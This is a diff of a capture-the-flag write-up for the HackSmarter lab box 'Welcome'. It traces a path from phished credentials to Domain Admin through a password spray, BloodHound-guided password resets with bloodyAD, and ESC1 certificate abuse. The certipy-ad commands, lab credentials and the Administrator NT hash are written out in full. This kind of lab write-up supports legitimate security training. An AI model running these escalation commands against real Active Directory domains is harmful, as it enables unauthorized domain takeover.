@@ -4,10 +4,18 @@ date: 2026-11-16T10:00:00-08:00
 draft: false
 tags: ["hacksmarter", "windows", "active-directory", "adcs", "esc1", "bloodhound", "privilege-escalation", "oscp", "writeup"]
 categories: ["Writeups"]
+cover:
+  image: "cover.jpg"
+  relative: true
+  alt: "Welcome Start Guide"
 ShowToc: true
 TocOpen: false
 summary: "A HackSmarter Active Directory box. We phish our way in with a single set of creds, spray a default password to pick up a second user, abuse HR GenericAll and ForceChangePassword through BloodHound, then ride an ESC1 certificate template to Domain Admin."
 ---
+
+Box name - Welcome
+
+Difficulty - Easy
 
 Objective:
 
@@ -17,7 +25,7 @@ You are a member of the Hack Smarter Red Team. During a phishing engagement, you
 
 ## Initial Enumeration
 
-RustScan results:
+RustScan results
 
 ```
 Open 10.1.90.1:53
@@ -42,103 +50,101 @@ Open 10.1.90.1:49718
 Open 10.1.90.1:49737
 ```
 
-Starting credentials:
+Starting Credentials:
 
 ```
 e.hills:Il0vemyj0b2025!
 ```
 
-![nxc smb enumeration with e.hills showing readable shares](welcome-00.png)
+![welcome-00](welcome-00.png)
 
-Our user can read the share "Human Resources".
+Our user can read the share “Human Resources”.
 
-![PDF prompting for a password](welcome-01.png)
+![welcome-01](welcome-01.png)
 
-The Welcome Start Guide requires a password. It's found in the e.hills SMB share.
+Welcome Start Guide requires password → Found in user e.hills smb share.
 
-![hashcat cracking the PDF password](welcome-02.png)
+![welcome-02](welcome-02.png)
 
-Password for the file "humanresources".
+Password for file “humanresources”.
 
-![Welcome Start Guide listing the default account password (redacted)](welcome-03.png)
+![welcome-03](welcome-03.png)
 
-Default password: [REDACTED]
+Default passwords [REDACTED]
 
 Looks like a potential password spray.
 
-LDAP doesn't seem to be working, so how can we find more users?
+LDAP doesn’t seem to be working, how can we find more users?
 
-WinRM and RDP also look like they don't work for the initial user.
+WinRM and RDP look like they don’t work for initial user.
 
-![Common contacts from the start guide](welcome-04.png)
+![welcome-04](welcome-04.png)
 
 We get a list of users with LDAP!
 
-![LDAP user enumeration](welcome-05.png)
+![welcome-05](welcome-05.png)
 
 ---
 
 ## Password Spray
 
-One of our users can log in with the sprayed default password.
+One of our users has a login ability with the sprayed credentials.
 
-![nxc smb password spray against the user list (passwords redacted)](welcome-06.png)
+![welcome-06](welcome-06.png)
 
-```
 a.harris:[REDACTED]
-```
 
-![nxc smb shares for a.harris (password redacted)](welcome-07.png)
+![welcome-07](welcome-07.png)
 
-Our user has the same shares as the initial credentials.
+Our user has the same shares as initial credentials.
 
 ---
 
 ## BloodHound
 
-We ran BloodHound collection as `a.harris` and found that the user is a member of the HR group, which has GenericAll over the I.PARK user.
+We did bloodhound collection with our user `a.harris` and found our users has GenericAll through the HR department for
 
-![BloodHound: a.harris is MemberOf HR, which has GenericAll over I.PARK](welcome-08.png)
+![welcome-08](welcome-08.png)
 
-We saw the `I.PARK` user has ForceChangePassword over two service users, `SVC_WEB` and `SVC_CA`.
+We saw the `I.PARK` user has ForceChangePassword over two SVC users, `SVC_WEB` and `SVC_CA`.
 
-![BloodHound: I.PARK has ForceChangePassword over SVC_WEB and SVC_CA](welcome-09.png)
+![welcome-09](welcome-09.png)
 
 ---
 
 ## Privilege Escalation
 
-We were able to successfully change the password of that user. For future reference, make sure in bloodyAD syntax that you use proper capitalization on DC01, Host, etc.
+We were able to successfully change the password of that user. For future reference make sure in bloodyAD syntax that you use proper capitalization on DC01, Host, etc.
 
-![bloodyAD changing I.PARK's password (a.harris password redacted)](welcome-10.png)
+![welcome-10](welcome-10.png)
 
-Let's check that user's credentials.
+Let’s check that user’s credentials.
 
-![nxc smb confirming the new I.PARK password works](welcome-11.png)
+![welcome-11](welcome-11.png)
 
 That worked!
 
-![svc_ca and svc_web shares](welcome-12.png)
+![welcome-12](welcome-12.png)
 
-These users don't have any additional shares to look through.
+These users don’t have any additional shares to look through.
 
 ---
 
 ## ADCS (ESC1)
 
-![certipy-ad find enumerating certificate templates](welcome-13.png)
+![welcome-13](welcome-13.png)
 
 ESC1 and ESC17.
 
-![Welcome-Template showing the ESC1 / ESC17 vulnerabilities](welcome-14.png)
+![welcome-14](welcome-14.png)
 
-Template = Welcome-Template.
+Template = Welcome-Template
 
 Should we try to get this user with an ESC1 certificate?
 
-![BloodHound: Administrator is MemberOf Domain Admins](welcome-15.png)
+![welcome-15](welcome-15.png)
 
-![ESC1 exploitation with certipy (reference example)](welcome-16.png)
+![welcome-16](welcome-16.png)
 
 ```
 certipy-ad req -u 'svc_ca@WELCOME.LOCAL' -p 'Password123!' -dc-ip 10.1.90.1 -target 10.1.90.1 -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'Administrator@WELCOME.LOCAL' -sid 'S-1-5-21-141921413-1529318470-1830575104-500'
@@ -154,7 +160,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
-![certipy-ad req requesting the Administrator certificate](welcome-17.png)
+![welcome-17](welcome-17.png)
 
 ```
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.90.1 -domain WELCOME.LOCAL -username Administrator
@@ -172,7 +178,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@welcome.local': aad3b435b51404eeaad3b435b51404ee:0cf1b799460a39c852068b7c0574677a
 ```
 
-![certipy-ad auth retrieving the Administrator TGT and NT hash](welcome-18.png)
+![welcome-18](welcome-18.png)
 
 ```
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.90.1 -domain WELCOME.LOCAL -username Administrator -ldap-shell
@@ -182,6 +188,6 @@ certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.90.1 -domain WELCOME.LOCAL -u
 
 ## Domain Admin
 
-![Evil-WinRM shell as welcome\administrator](welcome-19.png)
+![welcome-19](welcome-19.png)
 
 GG. <3
